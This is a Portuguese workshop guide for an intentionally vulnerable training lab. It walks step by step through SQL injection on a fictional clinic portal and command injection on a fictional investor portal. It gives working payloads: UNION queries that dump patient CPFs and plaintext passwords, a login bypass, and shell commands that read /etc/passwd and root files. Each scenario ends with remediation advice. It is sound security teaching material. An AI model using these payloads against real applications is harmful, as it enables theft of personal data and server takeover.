<!-- Documento original do workshop. As flags foram substituidas pelos
     marcadores __C1_FLAG__ / __C2_FLAG__ (preenchidos por infra/.env). -->

# Workshop — Passo a passo completo (Cenários 1 e 2)

> Guia prático **progressivo e completo** (inclui a captura da flag e as técnicas
> avançadas do roteiro do instrutor). A pessoa descobre a falha aos poucos: começa
> pelo uso normal e evolui até o impacto total.
>
> Ambiente **de treinamento, deliberadamente vulnerável**. Use somente no lab isolado.

**Índice**
- [Cenário 1 — SQL Injection](#cenário-1--sql-injection-medclinic--portal-do-paciente)
- [Cenário 2 — Command Injection](#cenário-2--command-injection-meridian-capital--portal-do-investidor)

---

# Cenário 1 — SQL Injection (MedClinic · Portal do Paciente)

**Acesso:** `https://<IP>:3000/` · Login: `user` / `user123`

A ideia: você está logado como um **paciente comum** e só deveria ver **os seus
próprios exames**. Vamos usar o campo de busca normalmente e, aos poucos, descobrir
que dá pra enganá-lo — até vazar a base inteira e capturar a flag.

> 💡 **Dica de sintaxe (MySQL):** usamos `#` como comentário (não `--`), porque o
> `--` exige um **espaço depois** e formulários web costumam apagar espaços no fim.

---

### Passo 1 — Usar o portal normalmente
1. Faça login com `user` / `user123`.
2. Repare na tela: seus dados, convênio, consultas e a lista de **exames da sua conta**.
3. No campo **"Buscar nos meus exames"**, digite:

   ```
   colesterol
   ```

4. **O que acontece:** aparecem só os exames de colesterol **da sua conta**. Na coluna
   *Paciente* está sempre o **seu nome**.

> 🧠 Sensação do usuário: *"o sistema só me mostra o que é meu."*

---

### Passo 2 — Buscar outra coisa (confirmar o comportamento normal)
Busque outro termo, por exemplo:

```
hemograma
```

**O que acontece:** de novo, só os seus exames. O filtro "parece" seguro.

---

### Passo 3 — Testar um caractere "estranho" (o primeiro sinal)
A busca monta uma consulta ao banco de dados. Vamos ver se o que digitamos **interfere**
nessa consulta. Digite **apenas uma aspa simples**:

```
'
```

**O que acontece:** a tela mostra um **erro** (erro de sintaxe no banco).

> 💡 **Esse erro é a descoberta.** Se uma aspa quebra o sistema, é porque **o que eu
> digito está sendo colado direto na consulta do banco** — e não tratado como texto
> simples. É a porta de entrada da falha.

---

### Passo 4 — "Fechar" a aspa e comentar o resto
Se uma aspa sozinha quebra, vamos **fechá-la** e **anular o resto** da consulta com um
comentário. Digite:

```
' #
```

**O que acontece:** o erro some e a busca volta a "funcionar". Confirmamos que
**controlamos** a consulta — abrimos/fechamos a aspa e comentamos o que vem depois.

---

### Passo 5 — Forçar uma condição "sempre verdadeira" (o vazamento)
Em vez de filtrar pelos *meus* exames, vamos adicionar uma condição **sempre verdadeira**:

```
' OR 1=1 #
```

**O que acontece:** a lista **explode** — exames de **centenas de pacientes diferentes**,
nomes reais, categorias e resultados. O contador no topo salta para milhares de exames
e ~1000 pacientes.

> 🔴 **Momento de impacto.** Um paciente comum, logado na própria conta, acabou de ler
> o **prontuário de todos os outros**.

**Por quê:** a busca virou algo como
`... WHERE paciente = 1 AND exame LIKE '%...%' OR 1=1` → como `OR 1=1` é sempre
verdadeiro (e `AND` tem precedência sobre `OR`), o filtro de paciente deixou de importar.

---

### Passo 6 — Descobrir o número de colunas (preparar o `UNION`)
Para puxar dados de **outras tabelas**, usamos `UNION` — mas ele exige saber **quantas
colunas** a consulta tem. Descobrimos por tentativa, com `ORDER BY`:

```
' ORDER BY 5 #
```
→ funciona.

```
' ORDER BY 6 #
```
→ **dá erro**.

> 💡 Erro no 6 e sucesso no 5 ⇒ a consulta tem **5 colunas**. Agora o `UNION` precisa
> ter exatamente 5 colunas também.

---

### Passo 7 — Capturar a flag (UNION-based injection)
Com 5 colunas, injetamos um `UNION` lendo a tabela secreta. O `1=2` zera os exames
reais, deixando só a linha da flag:

```
' AND 1=2 UNION SELECT flag, CURDATE(), 'secret', name, flag FROM secrets #
```

**O que acontece:** a **flag** aparece na coluna *Paciente* (e em *Resultado*):

```
__C1_FLAG__
```

> ✅ Submeta essa flag na plataforma do workshop para pontuar.

---

### Passo 8 — Vazar dados pessoais / CPF (UNION na tabela `patients`)
A busca mostra 5 colunas (*Paciente | Data | Categoria | Exame | Resultado*). No `UNION`
você escolhe **o que cai em cada coluna** — e pode ler **outra tabela**:

```
' AND 1=2 UNION SELECT name, birthdate, cpf, email, phone FROM patients #
```

**O que acontece:** nome, nascimento, **CPF**, e-mail e telefone de **todos os ~1000
pacientes**.

Versão "completa" (junta endereço e convênio no último campo):

```
' AND 1=2 UNION SELECT name, birthdate, cpf, email, CONCAT(phone,' · ',address,' · ',insurance,' ',insurance_id) FROM patients #
```

---

### Passo 9 — Roubar credenciais (UNION na tabela `users`)
```
' AND 1=2 UNION SELECT username, '', password, role, fullname FROM users #
```

**O que acontece:** vaza as senhas **em texto puro**:
- `user` / `user123`
- `admin` / `S3nh4Admin!2024`

> 🔴 Escalada: de "ver exames" para **assumir a conta do admin**.

---

### Passo 10 (Bônus) — Bypass de login
Na tela de login, no campo **usuário**, digite o seguinte (com **qualquer** senha):

```
admin'#
```

**O que acontece:** você entra como **admin**. A consulta vira
`... WHERE username = 'admin'#' AND password = '...'` → o `#` comenta a checagem de senha.

---

### Recapitulando o Cenário 1
| Passo | O que digitou | O que ensinou |
|---|---|---|
| 1–2 | `colesterol`, `hemograma` | uso normal: "só vejo o meu" |
| 3 | `'` | o input chega na consulta (erro) |
| 4 | `' #` | dá pra controlar a consulta |
| 5 | `' OR 1=1 #` | **vazamento de todos os pacientes** |
| 6 | `' ORDER BY 5/6 #` | descobrir o nº de colunas (5) |
| 7 | `UNION ... FROM secrets` | **captura da flag** |
| 8 | `UNION ... FROM patients` | vazar CPF/dados pessoais |
| 9 | `UNION ... FROM users` | roubar credenciais (texto puro) |
| 10 | `admin'#` (login) | bypass de autenticação |

**Flag:** `__C1_FLAG__`

**Mensagem para o gestor:** um campo de busca que "só mostra os seus exames" entregou o
prontuário de 1000 pacientes — nomes, CPF, diagnósticos, sorologias — e até as senhas.
**Correção:** consultas parametrizadas (prepared statements) + autorização no servidor
(nunca confiar que o filtro na query protege o dado) + senhas com hash forte.

---
---

# Cenário 2 — Command Injection (Meridian Capital · Portal do Investidor)

**Acesso:** `https://<IP>:3001/` · Login: `investidor` / `Invest@2024`

A ideia: o portal tem um botão **"Backup da carteira"** que exporta seus dados para um
**destino** que você digita. Vamos usar normalmente e descobrir que o campo "destino"
executa comandos no servidor — como **root**.

> 💡 Separadores que **mostram a saída** do comando: `;`, `|`, `&&`, `||`.
> (`$(...)` e crases também executam, mas a saída vira *argumento* e não aparece — para
> ler arquivos, use `;`, `|` ou `&&`.)

---

### Passo 1 — Usar o backup normalmente
1. Faça login com `investidor` / `Invest@2024`.
2. Veja a carteira (patrimônio, posições, alocação).
3. No card **"Backup da carteira"**, deixe o destino padrão:

   ```
   s3://meridian-backups/carteira
   ```

4. Clique em **Exportar carteira**. Aparece a saída de um comando:

   ```
   $ tar -czvf /tmp/carteira_backup.tar.gz -C /usr/src/app/data . 2>&1; echo Backup gerado. Exportando para destino s3://meridian-backups/carteira
   ./
   ./carteira.json
   Backup gerado. Exportando para destino s3://meridian-backups/carteira
   ```

> 🧠 Repare: **o destino que você digitou aparece colado no comando**. Guarde essa observação.

---

### Passo 2 — Trocar o destino (confirmar que ele entra no comando)
Troque o destino por qualquer texto:

```
meu-backup-teste
```

**O que acontece:** o texto digitado aparece de novo **dentro do comando**. O campo não
é só um rótulo — ele vira parte do comando que o servidor executa.

> 💡 Se o que eu digito entra num comando do sistema, será que dá pra **anexar um
> segundo comando**?

---

### Passo 3 — Anexar um comando + confirmar o privilégio
Em Linux, o `;` separa comandos. No campo destino, digite:

```
x; id
```

**O que acontece:** além da mensagem normal, aparece a saída do `id`:

```
uid=0(root) gid=0(root) groups=0(root)
```

> 🔴 **Dois choques:** (1) o campo "destino" **executou um comando** (injeção
> confirmada); (2) `uid=0(root)` → o servidor roda como **root**. Controle total.

---

### Passo 4 — Confirmar com outros separadores
Mostre que não é sorte (um de cada vez):

```
x | whoami
x && id
```

**O que acontece:** todos retornam a saída → a brecha é geral.

---

### Passo 5 — Capturar a flag (como root)
```
x; cat /root/flag.txt
```

**O que acontece:**

```
__C2_FLAG__
```

> ✅ `/root/flag.txt` tem permissão `600` (só root lê) — e nós somos root.
> Submeta a flag na plataforma.

---

### Passo 6 — Mostrar o poder do RCE (impacto)
Já que executamos comandos como root, dá pra ler **qualquer arquivo** e inspecionar o
servidor (um de cada vez):

```
x; ls -la /root
x; cat /etc/passwd
x; uname -a; hostname; ps aux
x; cat /usr/src/app/data/carteira.json
```

> 🔴 A função de "backup da carteira" virou **controle total do servidor**: o atacante
> lê qualquer arquivo (inclusive a base de carteiras dos clientes), cria usuários,
> instala backdoor e pivota para a rede interna.

---

### Recapitulando o Cenário 2
| Passo | O que digitou | O que ensinou |
|---|---|---|
| 1 | `s3://meridian-backups/carteira` | uso normal; destino aparece no comando |
| 2 | `meu-backup-teste` | o destino entra mesmo no comando |
| 3 | `x; id` | **injeção confirmada + rodando como root** |
| 4 | `x | whoami`, `x && id` | a brecha é geral |
| 5 | `x; cat /root/flag.txt` | **captura da flag** |
| 6 | `x; ls -la /root`, `x; cat /etc/passwd` | leitura de arquivos / RCE total |

**Flag:** `__C2_FLAG__`

**Mensagem para o gestor:** uma funcionalidade legítima ("exportar backup") entregou
execução de comandos como root. **Correção:** nunca concatenar entrada do usuário em
comandos de shell; usar APIs que separam comando e argumentos (sem shell); validar a
entrada com allow-list; e rodar o serviço com **privilégio mínimo** (nunca como root).

---

> **Dica de condução:** vá devagar e deixe a turma **prever** o próximo passo. O "aha"
> acontece no Passo 3 de cada cenário (o erro na busca; o `uid=0(root)`). O impacto
> emocional vem no vazamento em massa (C1) e no "sou root" (C2). Guarde a flag para o
> final de cada bloco, como "troféu" do exercício.
